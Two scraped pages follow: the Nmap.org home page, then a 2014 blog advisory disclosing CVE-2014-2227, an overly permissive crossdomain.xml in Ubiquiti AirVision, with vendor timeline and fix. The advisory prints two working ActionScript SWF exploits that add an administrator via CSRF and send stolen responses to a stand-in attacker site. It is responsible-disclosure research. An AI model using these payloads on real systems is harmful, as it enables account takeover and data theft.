=== Content from nmap.org_9ba698e9_20250126_104326.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from sethsec.blogspot.com_06c57407_20250126_104324.html ===

[Skip to main content](#main)

### Search This Blog

# [SethSec](https://sethsec.blogspot.com/)

### CVE-2014-2227

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html "permanent link")

This CVE covers a vulnerability found in the Ubiquiti Networks AirVision application.  For more background on this particular vulnerability, check out this post:

[Exploiting misconfigured crossdomain.xml files](http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html)

In fact, I wrote that first crossdomain.xml blog post after finding this AirVision vulnerability back in February.  If you already read that post, you should recognize the vulnerable form I use for the POC here (adding an administrator), is the same one I used earlier.

Here is a cleaned up version of what I sent to Ubiquiti back in February:

# AirVision Controller v2.1.3 - Overly Permissive default crossdomain.xml

CWE-264: <http://cwe.mitre.org/data/definitions/264.html>

**Misuse Case**

If the victim user is authenticated with their AirVision Controller, and they visit a malicious site, the owner of the malicious site can make changes to, and read data from, the AirVision Controller. The malicious site can even add a new administrative user account.

Vulnerable default configuration:

![](https://lh3.googleusercontent.com/L9EZPENjUAo8DKZCtd4x3_IwEO6xcBb2k-NaebevoLACzHy8s88Pu3IWrSkHFVhfiemS4Wzuv7eKc5cdCO26Vij3Z0zb6JBIsFFMWcXCjpf1YZFkq-1Vl-k7K_mxYH3j02o2km1tgqc)

POC:

**Step 1:** Attacker hosts the malicious SWF on his/her server, and socially engineers a victim AirVision administrator who is currently logged in, to view the SWF file

**Step 2:** The victim, while logged into AirVision, views the SWF file on the attackers server:

![](https://lh3.googleusercontent.com/NnrdzwtTW_9EVFHqsa5-PiA3Bsjo9Ypg50jaamO5Ddewjp43uZjTuj_IAtVGsEO_yuwsuM91fffIUbJJ2Qe058Emqlq3a_nACg2UWjKLX_EhQW0Xi964JziC3nssz4hz7RcTPnhHxXg)

![](https://lh5.googleusercontent.com/uPnlSMK7_8UxoaQ8AsudJuQEZ1CMMp89n8rnkCnYtLeMyuRfe9XGe_TF4f3jF5C8G-2PNZ0EHcmuV6PK_e2xaG1cTk7aizJ_LI6YpFt3IvjFpT8vXN1iuFr29V-6tSwti3IJedc8sKA)

**Step 3:** The SWF loads on the victims machine, and makes a request on behalf of the victim (exploiting CSRF to add an administrator):

![](https://lh3.googleusercontent.com/E6Fe7o3CbQj2wqiW-FFlkX3d26wxcuTJspKmuAovCRpPjJVychkxQ3F9VUQITPfDaKXK4c-ORKbuA8ko2KH6nwTuNdJN1D2_GdryRVJy0L33BbKlxtV5IDe7xqapaPlzNiDyNwYmow8)

Response:
![](https://lh5.googleusercontent.com/dL-Pf78AVMYAO_tBPpg1_7luXYgeRR9bnPibZ6WtTNXLjX_ZLxBTDo20fBrE9gaXyN7ScwMXG69w4mnnzzT84Zc_GDBmdEaYIjK7wJWH-Y4dYn5wSwkm_vZ1aiqaYk2G0iVKaoiRQrs)

**Step 4:** The SWF is able to bypass Same-Origin-Policy because of the overly permissive crossdomain.xml file, and it records the server response to the previous request, and sends that to the attacker:
![](https://lh4.googleusercontent.com/xN9QwKK3gJa5vAbatv9IjCdc300vI41Bw93qJkM7bDg37ISH9gWM4xlcizpUABNmvcYPCsLsHiKJPGLrAx7uq3SZhT0MvcAnWzCxk164AT-paLUzTqepe05IMxf-8y--Cl9OOb1AvLE)

The server receives the information and responds with a HTTP 200 OK.
![](https://lh5.googleusercontent.com/FyOVInWVphGVZIEueiRCuDvUd5A-ew1ZrFSGiX_EGiQVokAyUVQnI30LXrTNi1CvlpK0lZNdlxuMKiO33B-LSJcpnGaeBNAq3fYUfKPjR9QoR1eyxbKUEIpJdhCxvCn_i7An5TLA6iM)
Here is another example of how an attacker could exploit this vulnerability, that is much different than what CSRF can do. In the screenshot below, the SWF makes a request to /api/2.0/log?type=error.  The SWF then reads the data that comes back from that request and sends it to the attacker’s server, where the attacker consumes the raw data.

![](https://lh3.googleusercontent.com/ZQujzD6NAslweprDVE2HGoerJaO6QuIUWCYnv-lgyUvuC2wWfA3ECSV-_kuQhLChGqqlLFtYZNxPXteDOoVkT9FGSb8Eq9gXsK3qxFV8HIhtJfG5wlvp3lZwjxqdM0muvwGNCXEK6q0)

Additional details:

(CVE-2014-2227) - Ubiquiti Networks - AirVision v2.1.3 - Overly Permissive default crossdomain.xml

-----------
Vendor:
-----------
Ubiquiti Networks (http://www.ubnt.com/)

----------------------------------------------
Affected Products/Versions:
----------------------------------------------
AirVision Controller v2.1.3
Note: Previous versions may be affected

-----------------
Description:
-----------------
Title: Overly Permissive default crossdomain.xml file
CVE: CVE-2014-2227
CWE: CWE-264: <http://cwe.mitre.org/data/definitions/264.html>
Researcher: Seth Art - @sethsec
Detailed writeup (includes screenshots): <http://sethsec.blogspot.com/2014/07/cve-2014-2227.html>

------------------------------------------------------------------------------------------------------
POC #1: Using crossdomain.xml to execute CSRF and add an  administrator:
------------------------------------------------------------------------------------------------------

// Customized AirVision POC Author: Seth Art (sethsec at gmail.com)
// POC Template Author: Gursev Singh Kalra (gursev.kalra at foundstone.com)
// POC Template Author's github: (<https://github.com/gursev/flash-xdomain-xploit>)
package {
 import flash.display.Sprite;
 import flash.events.\*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;
 import flash.net.URLRequestHeader;

 public class XDomainXploit3 extends Sprite {
  public function XDomainXploit3() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "https//victim:7443/api/2.0/admin";
   var header:URLRequestHeader = new URLRequestHeader("Content-Type",
"text/plain; charset=UTF-8");
   var readRequest:URLRequest = new URLRequest(readFrom);
   readRequest.method = URLRequestMethod.POST
   readRequest.data =
"{\"name\":\"csrf-cdp\",\"email\":\"csrf-cdp@gmail.com\",\"userGroup\":\"admin\",\"x\_password\":\"password\",\"confirmPassword\":\"password\",\"disabled\":false}";
   readRequest.requestHeaders.push(header);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }

  private function eventHandler(event:Event):void {
   // URL to which retrieved data is to be sent
   var sendTo:String = "<http://www.malicious-site.com/crossdomain/store.php>"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}

-----------------------------------------------------------------------
POC #2: Using crossdomain.xml to exfiltrate log data:
-----------------------------------------------------------------------

// Customized AirVision POC Author: Seth Art (sethsec at gmail.com)
// POC Template Author: Gursev Singh Kalra (gursev.kalra at foundstone.com)
// POC Template Author's github: (<https://github.com/gursev/flash-xdomain-xploit>)
package {
 import flash.display.Sprite;
 import flash.events.\*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;

 public class XDomainXploit extends Sprite {
  public function XDomainXploit() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "/victim:7443/api/2.0/admin";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }

  private function eventHandler(event:Event):void {
   // URL to which retrieved data is to be sent
   var sendTo:String = "<http://www.malicious-site.com/admin>"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}

-------------
Solution:
-------------
AirVision Controller - Upgrade to UniFi Video v3.0.1 or greater (Note: The application name changed from AirVision to UniFi Video)

-----------------------------
Disclosure Timeline:
-----------------------------

2014-02-25: Notified Ubiquiti of crossdomain vulnerability in AirVision product
2014-02-19: Ubiquti confirms receipt of AirVision report and existence of the vulnerability
2014-02-28: CVE-2014-2227 assigned
2014-03-12: Requested status update
2014-03-27: Requested status update
2014-04-07: Requested status update
2014-04-09: Ubiquiti provides timeline for solution
2014-04-18: UniFi Video 3.0.1 is released
2014-06-13: Set public disclosure date of 2014-07-24
2014-07-24: Public disclosure

[crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
[CSRF](https://sethsec.blogspot.com/search/label/CSRF)
[exploit](https://sethsec.blogspot.com/search/label/exploit)
[Flash](https://sethsec.blogspot.com/search/label/Flash)
[SWF](https://sethsec.blogspot.com/search/label/SWF)
[Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
[vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
[Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Comments

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/2467150705887262503)

### Popular posts from this blog

### [Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

-

[November 09, 2016](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html "permanent link")

[![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDAdiXxWBRlKa-3IX5mSeTJf_o9RZLPM2ULZeDXPLVbz1_LxpI5igNEamWrUhAO7mn50sJsKxxnf2DZZm3Z-J60Hgzl4FzcxwTywyGJpFefNSaW9e7ypaOw9qvZtibb0sX-SsBZ1CJxAQU/s640/pyinject-vulncode1.png)](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

[Read more](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html "Exploiting Python Code Injection in Web Applications")

### [Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

-

[December 23, 2015](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html "permanent link")

[![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg04AN5MQr8g6sku-o5iqkrleECjtexRb_UJkpSTc12UhZ4NTNcEKgLoT8-rlnoQ1BrEK8C-3_d70d3JeCNeq3DyvAE2CyWHMjgKODXS3H3mNtRhtlsbD2V6OEQlY2O0aYzrx2tsl_10bvo/s400/burp-collaborator1.png)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...

[Read more](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html "Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)")

### [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "permanent link")

[![Image](https://lh4.googleusercontent.com/jUQ5YRvJRPdgEedzXqoF_zaEne2nXRH3Ul9KKiFAIh8rZu0xcPdE7Gb-n7_869b6UMOgrxaWxncd0CHR8od0Vwk-LNA6u62W_jtQ1lBXMGzAFWV4ggZEuDrM7-A_z6fNfulA2q66Rrs)](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)

This CVE covers three separate Ubiquiti Networks applications that are all vulnerable to CSRF: UniFi Controller mFi Controller AirVision Controller Ubiquiti - UniFi Controller v2.4.6 - Cross-site Request Forgery (CSRF) CWE-352: http://cwe.mitre.org/data/definitions/352.html The UniFi application is vulnerable to CSRF in multiple locations.  The CWE link above has a great summary of the vulnerability.  In the POC below, I demonstrate how an unauthenticated attacker can send a malicious hyperlink to an authenticated administrator, and how if the administrator clicks on the link, the attacker can force the authenticated administrator to perform quite a few actions without knowing it.  The most serious POC involves the attacker causing the administrator to create a second administrator account.  The attacker can now log into the Unifi controller with this second account (if they have network access to the Unifi controller), and perform any actions that a...

[Read more](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "CVE-2014-2225")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

### Archive

* [2022
  1](https://sethsec.blogspot.com/2022/)

  + [December
    1](https://sethsec.blogspot.com/2022/12/)

* [2017
  4](https://sethsec.blogspot.com/2017/)

  + [August
    1](https://sethsec.blogspot.com/2017/08/)
  + [June
    1](https://sethsec.blogspot.com/2017/06/)
  + [May
    2](https://sethsec.blogspot.com/2017/05/)
* [2016
  1](https://sethsec.blogspot.com/2016/)

  + [November
    1](https://sethsec.blogspot.com/2016/11/)
* [2015
  1](https://sethsec.blogspot.com/2015/)

  + [December
    1](https://sethsec.blogspot.com/2015/12/)
* [2014
  13](https://sethsec.blogspot.com/2014/)

  + [December
    1](https://sethsec.blogspot.com/2014/12/)
  + [November
    1](https://sethsec.blogspot.com/2014/11/)
  + [October
    2](https://sethsec.blogspot.com/2014/10/)
  + [July
    4](https://sethsec.blogspot.com/2014/07/)

    - [CVE-2014-2227](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html)
    - [CVE-2014-2226](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html)
    - [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)
    - [Real world exploitation of a misconfigured crossdo...](https://sethsec.blogspot.com/2014/07/crossdomain-bing.html)
  + [March
    2](https://sethsec.blogspot.com/2014/03/)
  + [January
    3](https://sethsec.blogspot.com/2014/01/)
* [2009
  1](https://sethsec.blogspot.com/2009/)

  + [October
    1](https://sethsec.blogspot.com/2009/10/)
* [2008
  5](https://sethsec.blogspot.com/2008/)

  + [June
    2](https://sethsec.blogspot.com/2008/06/)
  + [February
    2](https://sethsec.blogspot.com/2008/02/)
  + [January
    1](https://sethsec.blogspot.com/2008/01/)

Show more
Show less

### Labels

* [A1-Injection](https://sethsec.blogspot.com/search/label/A1-Injection)
* [ActionScript](https://sethsec.blogspot.com/search/label/ActionScript)
* [Active Directory](https://sethsec.blogspot.com/search/label/Active%20Directory)
* [Arris](https://sethsec.blogspot.com/search/label/Arris)
* [ASLA](https://sethsec.blogspot.com/search/label/ASLA)
* [attack](https://sethsec.blogspot.com/search/label/attack)
* [AWS](https://sethsec.blogspot.com/search/label/AWS)
* [Azure](https://sethsec.blogspot.com/search/label/Azure)
* [bash](https://sethsec.blogspot.com/search/label/bash)
* [bash\_profile](https://sethsec.blogspot.com/search/label/bash_profile)

* [bond](https://sethsec.blogspot.com/search/label/bond)
* [bridge](https://sethsec.blogspot.com/search/label/bridge)
* [Burp](https://sethsec.blogspot.com/search/label/Burp)
* [Burp Extensions](https://sethsec.blogspot.com/search/label/Burp%20Extensions)
* [Burp Pro](https://sethsec.blogspot.com/search/label/Burp%20Pro)
* [BurpSuite](https://sethsec.blogspot.com/search/label/BurpSuite)
* [bWAPP](https://sethsec.blogspot.com/search/label/bWAPP)
* [Citrix Xen](https://sethsec.blogspot.com/search/label/Citrix%20Xen)
* [Cloud](https://sethsec.blogspot.com/search/label/Cloud)
* [Cloud Security](https://sethsec.blogspot.com/search/label/Cloud%20Security)
* [CloudSec](https://sethsec.blogspot.com/search/label/CloudSec)
* [Collect](https://sethsec.blogspot.com/search/label/Collect)
* [crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
* [CSRF](https://sethsec.blogspot.com/search/label/CSRF)
* [CVE-2014-5437](https://sethsec.blogspot.com/search/label/CVE-2014-5437)
* [CVE-2014-5438](https://sethsec.blogspot.com/search/label/CVE-2014-5438)
* [CWE-441](https://sethsec.blogspot.com/search/label/CWE-441)
* [CWE-918](https://sethsec.blogspot.com/search/label/CWE-918)
* [drupal](https://sethsec.blogspot.com/search/label/drupal)
* [EC2](https://sethsec.blogspot.com/search/label/EC2)
* [eval](https://sethsec.blogspot.com/search/label/eval)
* [exploit](https://sethsec.blogspot.com/search/label/exploit)
* [External service interaction](https://sethsec.blogspot.com/search/label/External%20service%20interaction)
* [Flash](https://sethsec.blogspot.com/search/label/Flash)
* [gallery](https://sethsec.blogspot.com/search/label/gallery)
* [GCP](https://sethsec.blogspot.com/search/label/GCP)
* [interface](https://sethsec.blogspot.com/search/label/interface)
* [Kerberos](https://sethsec.blogspot.com/search/label/Kerberos)
* [lirc](https://sethsec.blogspot.com/search/label/lirc)
* [login-CSRF](https://sethsec.blogspot.com/search/label/login-CSRF)
* [multi-stage CSRF](https://sethsec.blogspot.com/search/label/multi-stage%20CSRF)
* [mysql](https://sethsec.blogspot.com/search/label/mysql)
* [MythTV](https://sethsec.blogspot.com/search/label/MythTV)
* [network TAP](https://sethsec.blogspot.com/search/label/network%20TAP)
* [nsm](https://sethsec.blogspot.com/search/label/nsm)
* [Offensive Security](https://sethsec.blogspot.com/search/label/Offensive%20Security)
* [Out-of-band resource load](https://sethsec.blogspot.com/search/label/Out-of-band%20resource%20load)
* [Penetration Testing](https://sethsec.blogspot.com/search/label/Penetration%20Testing)
* [Pentest Lab](https://sethsec.blogspot.com/search/label/Pentest%20Lab)
* [Photos](https://sethsec.blogspot.com/search/label/Photos)
* [Pictures](https://sethsec.blogspot.com/search/label/Pictures)
* [POC](https://sethsec.blogspot.com/search/label/POC)
* [Proxmox](https://sethsec.blogspot.com/search/label/Proxmox)
* [pvr-150](https://sethsec.blogspot.com/search/label/pvr-150)
* [Python](https://sethsec.blogspot.com/search/label/Python)
* [Python Code Injection](https://sethsec.blogspot.com/search/label/Python%20Code%20Injection)
* [RAID5](https://sethsec.blogspot.com/search/label/RAID5)
* [scripting](https://sethsec.blogspot.com/search/label/scripting)
* [security onion](https://sethsec.blogspot.com/search/label/security%20onion)
* [Server-Side Request Forgery](https://sethsec.blogspot.com/search/label/Server-Side%20Request%20Forgery)
* [Share](https://sethsec.blogspot.com/search/label/Share)
* [snort](https://sethsec.blogspot.com/search/label/snort)
* [so](https://sethsec.blogspot.com/search/label/so)
* [SPDIF](https://sethsec.blogspot.com/search/label/SPDIF)
* [SPN](https://sethsec.blogspot.com/search/label/SPN)
* [SSRF](https://sethsec.blogspot.com/search/label/SSRF)
* [SWF](https://sethsec.blogspot.com/search/label/SWF)
* [Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
* [ubuntu](https://sethsec.blogspot.com/search/label/ubuntu)
* [VMware](https://sethsec.blogspot.com/search/label/VMware)
* [vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
* [Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)
* [Wedding](https://sethsec.blogspot.com/search/label/Wedding)
* [WIndows 10](https://sethsec.blogspot.com/search/label/WIndows%2010)
* [Windows Server 2012r2](https://sethsec.blogspot.com/search/label/Windows%20Server%202012r2)
* [Windows Server 2016](https://sethsec.blogspot.com/search/label/Windows%20Server%202016)
